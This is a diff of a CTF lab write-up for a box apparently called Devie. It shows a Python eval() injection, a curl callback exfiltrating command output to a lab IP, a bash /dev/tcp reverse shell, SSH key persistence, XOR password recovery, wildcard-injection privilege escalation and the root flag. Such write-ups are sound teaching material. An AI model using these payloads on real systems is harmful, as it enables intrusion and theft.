@@ -1,27 +1,27 @@
 ---
 sticker: emoji//1f467
 ---
+# ENUMERATION
+---
 
-# DEVIE
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | SSH     |
 | 5000 | HTTP    |
 
-## RECONNAISSANCE
 
-***
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250504141045.png)
+
+# RECONNAISSANCE
+---
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504141045.png)
 
 As seen we got some math formulas we can use, also, we can get the source code, let's download it and perform some analysis on it:
 
@@ -68,13 +68,14 @@ def bisect(xa,xb):
         return root
 ```
 
-As seen, this function uses `eval()`, this allows us to get `RCE`, The code constructs a string `added = xa + " + " + xb` and evaluates it via `c = eval(added)`. An attacker can craft malicious input for `xa` or `xb` to form a valid Python expression that executes arbitrary code.
+
+As  seen, this function uses `eval()`, this allows us to get `RCE`, The code constructs a string `added = xa + " + " + xb` and evaluates it via `c = eval(added)`. An attacker can craft malicious input for `xa` or `xb` to form a valid Python expression that executes arbitrary code.
 
 We can now proceed to exploitation.
 
-## EXPLOITATION
 
-***
+# EXPLOITATION
+---
 
 Let's try some basic `RCE` using this:
 
@@ -82,13 +83,13 @@ Let's try some basic `RCE` using this:
 __import__('os').system('id')
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250504142444.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504142444.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250504142457.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504142457.png)
 
 We get an internal server error, this happens due to the payload being evaluated by the server and then converting the non numerical string (`xa`) to an integer, this causes a `ValueError`, which throws us the `500` status code error.
 
-So, how can we achieve the `RCE`?
+So, how can we achieve the `RCE`? 
 
 We can simply set up a python server and encode the contents of the command we are dealing with using `base64` so we can notice if the server actually executes the command, let's do the following command:
 
@@ -96,7 +97,8 @@ We can simply set up a python server and encode the contents of the command we a
 __import__('os').system('curl http://10.11.136.34:8000?pwned=$(id|base64)')
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250504142758.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504142758.png)
 
 We get `500` status code again, but if we check our python server, this happens:
 
@@ -121,13 +123,15 @@ __import__('os').system('bash -c "bash -i >& /dev/tcp/IP/9001 0>&1"')
 
 If we got our listener ready, we will receive the connection:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250504143524.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504143524.png)
 
 Let's begin privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+
+# PRIVILEGE ESCALATION
+---
+
 
 First step is to get ourselves a stable shell:
 
@@ -141,7 +145,7 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250504143634.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504143634.png)
 
 We can read first flag:
 
@@ -178,7 +182,7 @@ echo 'OUR_ID_RSA.PUB KEY' >> /home/bruce/.ssh/authorized_keys
 
 Now, let's go into ssh:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250504144058.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504144058.png)
 
 Nice, let's proceed to analyze those interesting files we found `checklist` and `note`:
 
@@ -280,7 +284,8 @@ password = password_bytes.decode('utf-8', errors='ignore').strip()
 print(f"\n[+] Gordon's password: {passw
 ```
 
-The script first generates a **known plaintext**, and uses the encryption tool to encode it. Since XOR encryption has a critical weakness,applying the same key twice cancels the encryption, the script compares the plaintext with its encrypted version to derive the secret XOR key. With the key extracted, the script then decrypts Gordon's encoded password (`NEUEDTIeN1MRDg5K`) by reversing the XOR operation. Finally, it decodes the result from Base64 to reveal the original password. This approach bypasses the need to directly access the encryption script or key, leveraging the predictable behavior of XOR to expose the hidden credentials.
+The script first generates a **known plaintext**, and uses the encryption tool to encode it. Since XOR encryption has a critical weakness,applying the same key twice cancels the encryption, the script compares the plaintext with its encrypted version to derive the secret XOR key. With the key extracted, the script then decrypts Gordon's encoded password (`NEUEDTIeN1MRDg5K`) by reversing the XOR operation. Finally, it decodes the result from Base64 to reveal the original password. This approach bypasses the need to directly access the encryption script or key, leveraging the predictable behavior of XOR to expose the hidden credentials.
+
 
 If we use the script, we get this:
 
@@ -340,11 +345,11 @@ drwxr-xr-x 5 gordon gordon 4096 May  4 20:29 ..
 
 It seems like there is some sort of backup going in the background by the root user that backups the contents of the `report` directory but, it changes the `ownership` to root, let's use `pspy` to check if its true:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250504153600.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504153600.png)
 
 Nothing weird on here, maybe we are checking for a binary, let's use linpeas then:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250504153821.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504153821.png)
 
 We got a `/usr/bin/backup`, let's check it out:
 
@@ -360,7 +365,7 @@ cd /home/gordon/reports/
 cp * /home/gordon/backups/
 ```
 
-As seen, this uses `*` to copy the contents of the `reports` directory to the `backups` directory, this is vulnerable to `wildcard injection` due to the `*` character being `unquoted`, we can get a root shell by doing the following:
+As seen, this uses `*` to copy the contents of the `reports` directory to the `backups` directory, this is vulnerable to `wildcard injection` due to the `*` character being `unquoted`,  we can get a root shell by doing the following:
 
 ```
 cd /home/gordon/reports/
@@ -383,7 +388,7 @@ drwxr-xr-x 6 gordon gordon    4096 May  4 20:36 ..
 -rw-r--r-- 1 root   root       100 May  4 21:07 report3
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250504160803.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504160803.png)
 
 There we go, let's read root flag and finish:
 
@@ -392,4 +397,5 @@ bash-5.0# cat /root/root.txt
 THM{J0k3r$_Ar3_W1ld}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250504160833.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250504160833.png)
+
